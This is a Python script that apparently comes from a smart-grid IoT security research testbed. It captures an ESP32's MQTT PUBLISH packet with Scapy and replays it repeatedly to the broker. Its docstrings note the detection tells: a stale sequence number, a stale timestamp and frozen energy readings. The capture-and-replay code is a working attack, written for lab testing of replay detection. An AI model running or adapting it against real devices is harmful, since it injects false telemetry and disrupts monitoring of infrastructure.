#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  MODULE BRIEFING: attack_replay.py — Replay Attack Simulator               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  PURPOSE:   Capture a legitimate MQTT packet from the ESP32 and replay it  ║
║             repeatedly to the broker, simulating a replay/freeze attack.   ║
║  INPUTS:    CLI args (duration, interval)                                  ║
║  OUTPUTS:   Replayed packets sent to MQTT broker                           ║
║  REQUIRES:  sudo, Scapy, Linux with raw socket permissions                ║
╚══════════════════════════════════════════════════════════════════════════════╝

RESEARCH DISCLAIMER:
    This script is for academic research purposes only.
    Use only on networks and devices you own and control.
    Replay attacks on public networks is illegal.
    This testbed is isolated to a local lab network (192.168.1.0/24).

WHAT THIS SCRIPT DOES:
    Phase A — CAPTURE: Sniff one legitimate MQTT PUBLISH packet from the real
              ESP32 (192.168.1.101) to the broker (192.168.1.100:1883).
    Phase B — REPLAY: Send that exact same packet over and over.

WHY THIS IS DETECTABLE:
    - Sequence number (seq) in the JSON payload never increments
    - Timestamp in the JSON payload is stale (doesn't match wall clock)
    - Energy accumulation (energy_Wh) never increases
    - HMAC is technically valid (it was signed by the real ESP32) but the
      timestamp/seq staleness gives it away
"""

import argparse
import sys
import time
from datetime import datetime

try:
    from scapy.all import (
        IP, TCP, Raw, Ether,
        sniff as scapy_sniff,
        send, sendp,
        conf
    )
except ImportError:
    print("[ERROR] Scapy is not installed. Run: pip install scapy")
    sys.exit(1)

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════

ESP32_IP = "192.168.1.101"
BROKER_IP = "192.168.1.100"
BROKER_PORT = 1883
CAPTURE_TIMEOUT = 30  # seconds to wait for a legitimate packet


# ═══════════════════════════════════════════════════════
# PHASE A — PACKET CAPTURE
# ═══════════════════════════════════════════════════════

def capture_legitimate_packet(timeout: int = CAPTURE_TIMEOUT):
    """
    Sniff one legitimate MQTT packet from the ESP32.
    
    Uses Scapy's sniff() with a BPF filter to capture only TCP packets
    from the ESP32's IP going to the MQTT broker port.
    
    Args:
        timeout: Max seconds to wait for capture
    
    Returns:
        Captured packet (Scapy packet object) or None
    """
    print(f"[CAPTURE] Listening for legitimate ESP32 packet...")
    print(f"[CAPTURE] Filter: tcp and src host {ESP32_IP} and dst port {BROKER_PORT}")
    print(f"[CAPTURE] Timeout: {timeout}s")
    print("-" * 60)
    
    captured = []
    
    def capture_callback(pkt):
        """Store the first MQTT-looking packet."""
        if pkt.haslayer(Raw):
            raw_data = bytes(pkt[Raw].load)
            # Check if this looks like an MQTT PUBLISH (first byte 0x30-0x3F)
            if len(raw_data) > 2 and (raw_data[0] & 0xF0) == 0x30:
                captured.append(pkt)
                print(f"[CAPTURE] ✓ Captured MQTT PUBLISH packet!")
                print(f"[CAPTURE]   Source: {pkt[IP].src}:{pkt[TCP].sport}")
                print(f"[CAPTURE]   Dest:   {pkt[IP].dst}:{pkt[TCP].dport}")
                print(f"[CAPTURE]   Size:   {len(raw_data)} bytes")
                print(f"[CAPTURE]   TTL:    {pkt[IP].ttl}")
                
                # Try to show a snippet of the payload
                try:
                    # Find the JSON payload in the MQTT frame
                    payload_str = raw_data.decode('utf-8', errors='ignore')
                    json_start = payload_str.find('{')
                    if json_start >= 0:
                        print(f"[CAPTURE]   Payload snippet: {payload_str[json_start:json_start+80]}...")
                except Exception:
                    pass
                
                return True  # Stop sniffing
        return False
    
    try:
        scapy_sniff(
            filter=f"tcp and src host {ESP32_IP} and dst port {BROKER_PORT}",
            prn=capture_callback,
            stop_filter=lambda pkt: len(captured) > 0,
            count=10,  # Check up to 10 packets
            timeout=timeout,
            store=False
        )
    except PermissionError:
        print("[ERROR] Permission denied. Run with sudo!")
        return None
    except Exception as e:
        print(f"[ERROR] Capture failed: {e}")
        return None
    
    if captured:
        return captured[0]
    else:
        print(f"[CAPTURE] ✗ No MQTT packets captured within {timeout}s timeout.")
        print(f"[CAPTURE]   Make sure the ESP32 is powered on and publishing.")
        return None


# ═══════════════════════════════════════════════════════
# PHASE B — REPLAY LOOP
# ═══════════════════════════════════════════════════════

def replay_packet(packet, duration: int = 60, interval: float = 5.0):
    """
    Replay a captured packet repeatedly.
    
    The replayed packet retains:
        - Original source IP (192.168.1.101 — legitimate)
        - Original MQTT payload (legitimate JSON with valid HMAC)
        - But: timestamp and seq are STALE (frozen at capture time)
    
    This is what makes it detectable:
        - seq number never increments
        - timestamp doesn't match wall clock
        - energy_Wh never increases
    
    Args:
        packet: Captured Scapy packet to replay
        duration: How long to replay (seconds)
        interval: Seconds between replays
    """
    start_time = time.time()
    end_time = start_time + duration
    replay_count = 0
    
    # Extract raw bytes for Layer 3 replay
    # We reconstruct IP/TCP/Raw to avoid Ether layer issues
    if packet.haslayer(IP):
        replay_pkt = IP(bytes(packet[IP]))
        # Delete checksums so Scapy recalculates them
        del replay_pkt[IP].chksum
        if replay_pkt.haslayer(TCP):
            del replay_pkt[TCP].chksum
    else:
        print("[ERROR] Captured packet has no IP layer — cannot replay")
        return
    
    print(f"\n[REPLAY] Starting replay attack")
    print(f"[REPLAY] Duration: {duration}s | Interval: {interval}s")
    print(f"[REPLAY] Expected replays: ~{int(duration / interval)}")
    print("-" * 60)
    
    try:
        while time.time() < end_time:
            try:
                send(replay_pkt, verbose=False)
                replay_count += 1
                remaining = int(end_time - time.time())
                ts = datetime.now().strftime('%H:%M:%S')
                
                print(f"[REPLAY] {ts} | Replay #{replay_count:>4} | "
                      f"src={ESP32_IP}(original) -> {BROKER_IP}:{BROKER_PORT} | "
                      f"STALE seq/timestamp | remaining={remaining}s")
                
            except Exception as e:
                print(f"[REPLAY] Send error: {e}")
            
            time.sleep(interval)
    
    except KeyboardInterrupt:
        print("\n[REPLAY] Interrupted by user (Ctrl+C)")
    
    elapsed = time.time() - start_time
    print("-" * 60)
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                   REPLAY ATTACK SUMMARY                     ║
╠══════════════════════════════════════════════════════════════╣
║  Duration:         {elapsed:.1f}s{' '*(40-len(f'{elapsed:.1f}'))}║
║  Packets Replayed: {replay_count:<41}║
║  Source IP:        {ESP32_IP} (legitimate — that's the point){' '*(6)}║
║  Detection Tell:   Stale seq + timestamp + frozen energy    ║
╚══════════════════════════════════════════════════════════════╝
""")


# ═══════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="SmartGrid Replay Attack Simulator (Research Only)",
        epilog="MUST be run with sudo on Linux. Lab network only."
    )
    parser.add_argument('--duration', type=int, default=60,
                        help='Replay duration in seconds (default: 60)')
    parser.add_argument('--interval', type=float, default=5.0,
                        help='Seconds between replays (default: 5.0)')
    parser.add_argument('--capture-timeout', type=int, default=30,
                        help='Max seconds to wait for initial capture (default: 30)')
    
    args = parser.parse_args()
    
    # Check for root
    import os
    if os.geteuid() != 0:
        print("[ERROR] This script requires root privileges.")
        print("[ERROR] Run with: sudo python3 attack_replay.py")
        sys.exit(1)
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║            SmartGrid Replay Attack Simulator                ║
║                  RESEARCH USE ONLY                          ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    # Phase A: Capture
    packet = capture_legitimate_packet(timeout=args.capture_timeout)
    
    if packet is None:
        print("[ABORT] No packet captured. Exiting.")
        sys.exit(1)
    
    # Phase B: Replay
    replay_packet(packet, duration=args.duration, interval=args.interval)


if __name__ == "__main__":
    main()
